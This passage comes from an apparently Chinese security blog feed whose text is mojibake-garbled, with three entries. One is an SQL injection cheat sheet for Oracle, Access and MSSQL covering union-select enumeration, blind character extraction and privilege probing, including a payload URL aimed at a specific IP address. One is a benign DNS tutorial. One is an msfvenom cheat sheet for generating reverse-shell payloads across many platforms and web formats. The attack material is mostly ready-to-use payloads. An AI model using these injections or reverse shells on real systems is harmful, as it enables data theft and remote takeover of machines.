class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[è¡¨å]&#39; and rownum&#x3D;1),null from dual-- &#x2F;&#x2F;æŸ¥çœ‹ç¬¬ä¸€ä¸ªå­—æ®µå</span><br><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[è¡¨å]&#39; and rownum&#x3D;1 and column_name&lt;&gt;&#39;[ç¬¬ä¸€ä¸ªå­—æ®µå]&#39;),null from dual-- &#x2F;&#x2F;æŸ¥çœ‹ç¬¬äºŒä¸ªå­—æ®µå</span><br><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[è¡¨å]&#39; and rownum&#x3D;1 and column_name&lt;&gt;&#39;[ç¬¬ä¸€ä¸ªå­—æ®µå]&#39; and column_name&lt;&gt;&#39;[ç¬¬äºŒä¸ªå­—æ®µåå]&#39;),null from dual-- &#x2F;&#x2F;æŸ¥çœ‹ç¬¬ä¸‰ä¸ªå­—æ®µå</span><br></pre></td></tr></table></figure><p>æŸ¥æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select id,name,pass from student where id&#x3D;1--  &#x2F;&#x2F;æŸ¥çœ‹æ•°æ®</span><br><span class="line"></span><br><span class="line">wmsys.wm_concat()ç­‰åŒäºMySQLä¸­çš„group_concat()ï¼Œåœ¨11gr2å’Œ12Cä¸Šå·²ç»æŠ›å¼ƒï¼Œå¯ä»¥ç”¨LISTAGG()æ›¿ä»£</span><br></pre></td></tr></table></figure><p>å¦‚æœå­—ç¬¦é›†ä¸åŒ¹é…ï¼š<br>åˆ™éœ€è¦è¿›è¡Œå­—ç¬¦é›†è½¬æ¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast(&#39;&#39; as nvarchar2(10))</span><br></pre></td></tr></table></figure><p>æ —å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8808&#x2F;?id&#x3D;-1%20union%20all%20select%20NULL,NULL,cast((select%20table_name%20from%20user_tables%20where%20rownum&#x3D;1)%20as%20nvarchar2(10)),1%20from%20dual--%20-</span><br></pre></td></tr></table></figure><h4 id="æ³¨æ„ç‚¹ï¼š"><a href="#æ³¨æ„ç‚¹ï¼š" class="headerlink" title="æ³¨æ„ç‚¹ï¼š"></a>æ³¨æ„ç‚¹ï¼š</h4><p>1.Oracle åœ¨ä½¿ç”¨union æŸ¥è¯¢çš„è·ŸMysqlä¸ä¸€æ ·Mysqlé‡Œé¢æˆ‘ç”¨1,2,3,4å°±èƒ½å ä½ï¼Œè€Œåœ¨Oracleé‡Œé¢æœ‰æ¯”è¾ƒä¸¥æ ¼çš„ç±»å‹è¦æ±‚ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ union selectçš„è¦å’Œå‰é¢çš„å­—æ®µç±»å‹ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨nullæ¥ä»£æ›¿ç«™ä½ã€‚</p><p>2.Oracleå’Œmysqlä¸ä¸€æ ·ï¼Œåˆ†é¡µä¸­æ²¡æœ‰limitï¼Œè€Œæ˜¯ä½¿ç”¨ä¸‰å±‚æŸ¥è¯¢åµŒå¥—çš„æ–¹å¼å®ç°åˆ†é¡µ(æŸ¥è¯¢ç¬¬ä¸€æ¡æ•°æ®â€œ&gt;=0&lt;=1â€) </p><p>ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;&#x3D; 1 ) WHERE RN &gt;&#x3D; 0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3126305494.png"></p><p>3.Oracleçš„å•è¡Œæ³¨é‡Šç¬¦å·æ˜¯â€“ï¼Œå¤šè¡Œæ³¨é‡Šç¬¦å·/**/</p><h3 id="Acessæ•°æ®æ³¨å…¥ï¼š"><a href="#Acessæ•°æ®æ³¨å…¥ï¼š" class="headerlink" title="Acessæ•°æ®æ³¨å…¥ï¼š"></a>Acessæ•°æ®æ³¨å…¥ï¼š</h3><p>åˆ¤æ–­å­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 1 --+-</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­è¡¨ï¼š</p><p>è”åˆæŸ¥è¯¢è¡¨ï¼Œå›æ˜¾æ­£å¸¸å³ä¸ºè¡¨å­˜åœ¨ï¼Œåä¹‹ä¸ºä¸å­˜åœ¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Union select * from è¡¨å   æˆ–  è¡¨åè¿˜å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥çŒœè¡¨åï¼Œ</span><br><span class="line"></span><br><span class="line">and 0&lt;&gt;(select count(*) from è¡¨å) </span><br></pre></td></tr></table></figure><p>åˆ—åä¹Ÿåªèƒ½é çŒœï¼Œå¦‚æœçŒœä¸åˆ°å°±åªèƒ½ä½¿ç”¨åç§»æ³¨å…¥æ¥ç¢°è¿æ°”äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and exists (select admin from admin)</span><br><span class="line"></span><br><span class="line">and exists (select count(åˆ—å) from è¡¨å)</span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µå†…å®¹ï¼š</p><p>çˆ†å­—æ®µå†…å®¹è¦åˆ†ä¸¤æ­¥ï¼Œå…ˆçŒœé•¿åº¦ï¼Œå†çŒœå†…å®¹çŒœé•¿åº¦ã€‚and (select len(admin) from admin)=5ï¼Œå¦‚æœæ­£ç¡®åˆ™å›æ˜¾æ­£å¸¸ã€‚</p><p>çŒœå†…å®¹ï¼Œä¸€ä¸ªä¸€ä¸ªå­—æ®µçš„çŒœï¼Œå’Œç›²æ³¨ä¸€æ ·çš„é“ç†ã€‚and (select asc(mid(admin,1,1)) from admin)&gt;95,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc(mid(åˆ—å,åˆ—æ•°N,1)) from è¡¨å) &gt; x</span><br><span class="line"></span><br><span class="line">topåçš„æ•°å­—ä¸ºè¯¥åˆ—çš„ç¬¬Nè¡Œï¼Œxä¸ºASCIIç ï¼Œåˆ—æ•°Nå°±æ˜¯åœ¨è¿™ä¸€åˆ—ä¸­çš„ç¬¬å‡ ä¸ªæ•°å­—</span><br><span class="line"></span><br><span class="line">asc()ä»ç„¶è¿˜æ˜¯è½¬æ¢ä¸ºasciiç çš„å‡½æ•°ï¼Œmid(admin,1,1)åˆ™ä¸ºæˆªå–adminå­—æ®µå†…å®¹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±ä¸ºç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚</span><br></pre></td></tr></table></figure><h3 id="MSSQLæ³¨å…¥ï¼š"><a href="#MSSQLæ³¨å…¥ï¼š" class="headerlink" title="MSSQLæ³¨å…¥ï¼š"></a>MSSQLæ³¨å…¥ï¼š</h3><p>æŸ¥è¯¢å½“å‰çš„ç”¨æˆ·æ•°æ®ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 having 1&#x3D;1--+-</span><br></pre></td></tr></table></figure><p>çŒœè¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and exists(select * from tablename)</span><br><span class="line">?id&#x3D;1 and (Select Count(*) from [è¡¨å])&gt;0</span><br></pre></td></tr></table></figure><p>çŒœå­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (Select Count(å­—æ®µå) from è¡¨å)&gt;0</span><br></pre></td></tr></table></figure><p>çˆ†å½“å‰è¡¨ä¸­çš„åˆ—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 group by admin.username having 1&#x3D;1â€“-+-</span><br></pre></td></tr></table></figure><p>çŒœå­—æ®µä¸­è®°å½•é•¿åº¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (select top 1 len(å­—æ®µå) from è¡¨å)&gt;0</span><br></pre></td></tr></table></figure><p>çŒœå­—æ®µä¸­çš„asciiå€¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (select top 1 asc(mid(å­—æ®µå,1,1)) from è¡¨å)&gt;0 access</span><br><span class="line">?id&#x3D;1 and (select top 1 unicode(substring(å­—æ®µå,1,1)) from æ•°æ®åº“å)&gt;0</span><br></pre></td></tr></table></figure><p>æŸ¥æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT name FROM master..syscolumns WHERE id &#x3D; (SELECT id FROM master..syscolumns WHERE name &#x3D; &#39;tablename&#39;)</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æƒé™ç»“æ„ï¼ˆmssqlï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(â€˜sysadminâ€™));â€“</span><br><span class="line">Â· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(â€˜serveradminâ€™));â€“</span><br><span class="line">Â· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(â€˜setupadminâ€™));â€“</span><br><span class="line">Â· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(â€˜securityadminâ€™));â€“</span><br><span class="line">Â· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(â€˜diskadminâ€™));â€“</span><br><span class="line">Â· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(â€˜bulkadminâ€™));â€“</span><br><span class="line">Â· ?id&#x3D;1 and 1&#x3D;(SELECT IS_MEMBER(â€˜db_ownerâ€™));â€“</span><br></pre></td></tr></table></figure><p>mssqlå†…ç½®å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â· ?id&#x3D;1 and (select @@version)&gt;0ã€€ã€€ã€€è·å¾—Windowsçš„ç‰ˆæœ¬å·</span><br><span class="line">Â· ?id&#x3D;1 and user_name()&#x3D;â€™dboâ€™ã€€ã€€ã€€ã€€ åˆ¤æ–­å½“å‰ç³»ç»Ÿçš„è¿æ¥ç”¨æˆ·æ˜¯ä¸æ˜¯sa</span><br><span class="line">Â· ?id&#x3D;1 and (select user_name())&gt;0ã€€ã€€çˆ†å½“å‰ç³»ç»Ÿçš„è¿æ¥ç”¨æˆ·</span><br><span class="line">Â· ?id&#x3D;1 and (select db_name())&gt;0ã€€ã€€ã€€å¾—åˆ°å½“å‰è¿æ¥çš„æ•°æ®åº“</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œå·¥ç¨‹å¸ˆå¿…å¤‡æŠ€èƒ½-IPä¸šåŠ¡ä¹‹DNS</title>
      <link href="2020/09/22/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD-IP%E4%B8%9A%E5%8A%A1%E4%B9%8BDNS/"/>
      <url>2020/09/22/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD-IP%E4%B8%9A%E5%8A%A1%E4%B9%8BDNS/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS-Client"><a href="#DNS-Client" class="headerlink" title="DNS Client"></a>DNS Client</h2><h3 id="é™æ€åŸŸåè§£æ"><a href="#é™æ€åŸŸåè§£æ" class="headerlink" title="é™æ€åŸŸåè§£æ"></a>é™æ€åŸŸåè§£æ</h3><p>é™æ€åŸŸåè§£æé€šè¿‡é™æ€åŸŸåè§£æè¡¨è¿›è¡Œï¼Œç”¨æˆ·æ‰‹åŠ¨å»ºç«‹åŸŸåå’ŒIPåœ°å€ä¹‹é—´çš„å¯¹åº”å…³ç³»è¡¨ï¼Œå°†ä¸€äº›å¸¸ç”¨çš„åŸŸåæ”¾å…¥è¡¨ä¸­ã€‚å½“å®¢æˆ·ç«¯éœ€è¦åŸŸåæ‰€å¯¹åº”çš„IPåœ°å€æ—¶ï¼Œé¦–å…ˆåˆ°é™æ€åŸŸåè§£æè¡¨ä¸­æŸ¥æ‰¾æŒ‡å®šçš„åŸŸåï¼Œä»è€Œè·å¾—æ‰€å¯¹åº”çš„IPåœ°å€ï¼Œæé«˜åŸŸåè§£æçš„æ•ˆç‡ã€‚</p><p>åŠ¨æ€åŸŸåè§£æï¼šç”¨æˆ·ç¨‹åºï¼ˆä¾‹å¦‚Pingã€Tracertï¼‰å¯¹åŸŸåæœåŠ¡å™¨ï¼ˆDNS Serverï¼‰çš„è®¿é—®æ˜¯é€šè¿‡DNSå®¢æˆ·ç«¯ï¼ˆDNS Clientï¼‰çš„ä¸€ä¸ªåœ°å€è§£æå™¨ï¼ˆResolverï¼‰å®Œæˆçš„ã€‚</p><h3 id="åŠ¨æ€DNSçš„å·¥ä½œè¿‡ç¨‹"><a href="#åŠ¨æ€DNSçš„å·¥ä½œè¿‡ç¨‹" class="headerlink" title="åŠ¨æ€DNSçš„å·¥ä½œè¿‡ç¨‹"></a>åŠ¨æ€DNSçš„å·¥ä½œè¿‡ç¨‹</h3><p>ç”¨æˆ·ä½¿ç”¨åŸŸåè®¿é—®æŸäº›åº”ç”¨æœåŠ¡æ—¶ï¼Œç”¨æˆ·ç¨‹åºé¦–å…ˆå‘DNSå®¢æˆ·ç«¯ä¸­çš„è§£æå™¨å‘å‡ºè¯·æ±‚ã€‚</p><p>è§£æå™¨æ”¶åˆ°ç”¨æˆ·ç¨‹åºå‘é€çš„DNSè¯·æ±‚åï¼Œé¦–å…ˆæŸ¥è¯¢æœ¬åœ°çš„åŸŸåç¼“å­˜ã€‚</p><p>æœ¬åœ°çš„åŸŸåç¼“å­˜ä¸­å­˜åœ¨è¯¥åŸŸåå¯¹åº”çš„æ˜ å°„è¡¨é¡¹ï¼Œè§£æå™¨å°±å°†åŸŸåå¯¹åº”çš„IPåœ°å€è¿”å›ç»™ç”¨æˆ·ç¨‹åºã€‚</p><p>æœ¬åœ°çš„åŸŸåç¼“å­˜æ²¡æœ‰å‘ç°æ‰€è¦æŸ¥æ‰¾çš„æ˜ å°„é¡¹ï¼Œè§£æå™¨å°±å‘åŸŸåæœåŠ¡å™¨ï¼ˆDNS Serverï¼‰å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚</p><p>åŸŸåæœåŠ¡å™¨æ”¶åˆ°æŸ¥è¯¢æŠ¥æ–‡åï¼Œé¦–å…ˆåˆ¤æ–­è¯·æ±‚çš„åŸŸåæ˜¯å¦å¤„äºè‡ªå·±è¢«æˆæƒç®¡ç†çš„å­åŸŸé‡Œï¼Œå†æ ¹æ®ä¸åŒçš„åˆ¤æ–­ç»“æœï¼Œå‘DNS Clientå‘é€ç›¸åº”çš„å“åº”æŠ¥æ–‡ã€‚</p><p>å¦‚æœæ˜¯åœ¨è‡ªå·±è¢«æˆæƒç®¡ç†çš„å­åŸŸèŒƒå›´ä¹‹å†…ï¼ŒæœåŠ¡å™¨é¦–å…ˆä»è‡ªå·±çš„æ•°æ®åº“ä¸­æŸ¥æ‰¾åŸŸåå¯¹åº”çš„IPåœ°å€ã€‚</p><p>å¦‚æœåˆ¤æ–­è¯¥åŸŸåä¸å±äºæœ¬åŸŸèŒƒå›´ä¹‹å†…ï¼Œå°±å°†è¯·æ±‚äº¤ç»™ä¸Šä¸€çº§çš„åŸŸåè§£ææœåŠ¡å™¨å¤„ç†ï¼Œç›´åˆ°å®Œæˆè§£æï¼Œå¹¶å°†è§£æçš„ç»“æœè¿”å›ç»™DNSå®¢æˆ·ç«¯ã€‚</p><p>DNSå®¢æˆ·ç«¯æ”¶åˆ°åŸŸåæœåŠ¡å™¨çš„å“åº”æŠ¥æ–‡åï¼Œå°†è§£æç»“æœè¿”å›ç»™åº”ç”¨ç¨‹åºã€‚</p><p>åŠ¨æ€åŸŸåè§£ææ”¯æŒç¼“å­˜åŠŸèƒ½ã€‚æ¯æ¬¡åŠ¨æ€è§£ææˆåŠŸçš„åŸŸåä¸IPåœ°å€çš„æ˜ å°„å‡å­˜æ”¾åœ¨åŠ¨æ€åŸŸåç¼“å­˜åŒºä¸­ï¼Œå½“ä¸‹ä¸€æ¬¡æŸ¥è¯¢ç›¸åŒåŸŸåçš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥ä»ç¼“å­˜åŒºä¸­è¯»å–ï¼Œä¸ç”¨å†å‘åŸŸåæœåŠ¡å™¨è¿›è¡Œè¯·æ±‚ã€‚ç¼“å­˜åŒºä¸­çš„æ˜ å°„åœ¨ä¸€æ®µæ—¶é—´åä¼šè¢«è€åŒ–åˆ é™¤ï¼Œä»¥ä¿è¯åŠæ—¶ä»åŸŸåæœåŠ¡å™¨å¾—åˆ°æœ€æ–°çš„å†…å®¹ã€‚è€åŒ–æ—¶é—´ç”±åŸŸåæœåŠ¡å™¨è®¾ç½®ï¼ŒDNSå®¢æˆ·ç«¯ä»åè®®æŠ¥æ–‡ä¸­è·å¾—è€åŒ–æ—¶é—´.</p><h3 id="å®éªŒæ‹“æ‰‘"><a href="#å®éªŒæ‹“æ‰‘" class="headerlink" title="å®éªŒæ‹“æ‰‘"></a>å®éªŒæ‹“æ‰‘</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2757956800.png"></p><p>æœ¬ä¾‹é™æ€åŸŸåservera,serverbæ·»åŠ åˆ°Clientä¸­ï¼Œhuawei.comåœ¨dns serverä¸­ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/81202518.png"></p><p>æ²¡æœ‰åŠ å…¥å‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3229198517.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3895838296.png"></p><p>åŠ å…¥å</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2036974384.png"></p><p>åˆ æ‰æ˜ å°„å†ping</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2916626236.png"></p><p>å› ä¸ºä¹‹å‰è§£ææˆåŠŸåï¼Œä¼šè‡ªåŠ¨ç¼“å­˜åˆ°cacheä¸­ï¼Œå°±ä¸éœ€è¦å†å‘æœåŠ¡å™¨å‘é€è¯·æ±‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œå·¥ç¨‹å¸ˆå…»æˆè®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit-æœ‰æ•ˆè´Ÿè½½å¤‡å¿˜å•</title>
      <link href="2020/09/21/Metasploit-%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E5%A4%87%E5%BF%98%E5%8D%95/"/>
      <url>2020/09/21/Metasploit-%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E5%A4%87%E5%BF%98%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œMSFç”Ÿæˆå„ç§æœ‰æ•ˆè´Ÿè½½çš„å‘½ä»¤å¤‡å¿˜å½•ï¼Œå»ºè®®æ”¶è—ï¼Œå¿˜äº†å°±æ‹¿å‡ºæ¥å¤šçœ‹çœ‹ï¼â€</p></blockquote><h1 id="åˆ—å‡ºæœ‰æ•ˆè½½è·ï¼š"><a href="#åˆ—å‡ºæœ‰æ•ˆè½½è·ï¼š" class="headerlink" title="åˆ—å‡ºæœ‰æ•ˆè½½è·ï¼š"></a>åˆ—å‡ºæœ‰æ•ˆè½½è·ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l</span><br></pre></td></tr></table></figure><h1 id="äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶"></a>äºŒè¿›åˆ¶æ–‡ä»¶</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Linuxï¼š</span><br><span class="line"></span><br><span class="line">msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¦è¿æ¥ç«¯å£&gt; -f elf&gt; shell.elf</span><br><span class="line"></span><br><span class="line">Winodw:</span><br><span class="line"></span><br><span class="line">msfvenom -p windows / meterpreter / reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f exe&gt; shell.exe</span><br><span class="line"></span><br><span class="line">Mac:</span><br><span class="line"></span><br><span class="line">msfvenom -p osx / x86 / shell_reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f macho&gt; shell.macho</span><br><span class="line"></span><br><span class="line">androidï¼š<span class="comment">//éœ€è¦ç­¾å</span></span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=&lt;IPåœ°å€&gt; LPORT=&lt;è¿æ¥çš„ç«¯å£&gt; -f apk -o payload.apk</span><br><span class="line"></span><br><span class="line">powershellï¼š</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;è¿æ¥çš„ç«¯å£&gt; LPORT=&lt;è¿æ¥çš„ç«¯å£&gt; -e cmd/powershell_base64 -i <span class="number">3</span> -f raw -o payload.ps1</span><br></pre></td></tr></table></figure><h1 id="ç½‘ç»œæœ‰æ•ˆè½½è·"><a href="#ç½‘ç»œæœ‰æ•ˆè½½è·" class="headerlink" title="ç½‘ç»œæœ‰æ•ˆè½½è·"></a>ç½‘ç»œæœ‰æ•ˆè½½è·</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"></span><br><span class="line">msfvenom -p php / meterpreter_reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f raw&gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="keyword">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">asp</span><br><span class="line"></span><br><span class="line">msfvenom -p windows / meterpreter / reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f asp&gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP</span><br><span class="line"></span><br><span class="line">msfvenom -p java / jsp_shell_reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f raw&gt; shell.jsp</span><br><span class="line"></span><br><span class="line">Warï¼š</span><br><span class="line"></span><br><span class="line">msfvenom -p java / jsp_shell_reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f war&gt; shell.war</span><br><span class="line"></span><br><span class="line">nodejs:</span><br><span class="line"></span><br><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=&lt;IPåœ°å€&gt; LPORT=&lt;è¿æ¥çš„ç«¯å£&gt;  -f raw -o payload</span><br><span class="line"></span><br><span class="line">ruby:</span><br><span class="line"></span><br><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=&lt;IPåœ°å€&gt; LPORT=&lt;è¿æ¥çš„ç«¯å£&gt; -f raw -o payload.rb</span><br><span class="line"></span><br><span class="line">lua:</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=&lt;IPåœ°å€&gt;  LPORT=&lt;è¿æ¥çš„ç«¯å£&gt; -f raw -o payload.lua</span><br></pre></td></tr></table></figure><h1 id="è„šæœ¬æœ‰æ•ˆè´Ÿè½½"><a href="#è„šæœ¬æœ‰æ•ˆè´Ÿè½½" class="headerlink" title="è„šæœ¬æœ‰æ•ˆè´Ÿè½½"></a>è„šæœ¬æœ‰æ•ˆè´Ÿè½½</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Pythonï¼š</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd / unix / reverse_python LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f raw&gt; shell.py</span><br><span class="line"></span><br><span class="line">shè„šæœ¬</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd / unix / reverse_bash LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f raw&gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd / unix / reverse_perl LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f raw&gt; shell.pl</span><br></pre></td></tr></table></figure><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">åŸºäºLinuxçš„Shellcode</span><br><span class="line"></span><br><span class="line">msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f &lt;è¯­è¨€&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">åŸºäºWindowsçš„Shellcode</span><br><span class="line"></span><br><span class="line">msfvenom -p windows / meterpreter / reverse_tcp LHOST = &lt;IPåœ°å€&gt; LPORT = &lt;è¿æ¥çš„ç«¯å£&gt; -f &lt;è¯­è¨€&gt;</span><br><span class="line"></span><br><span 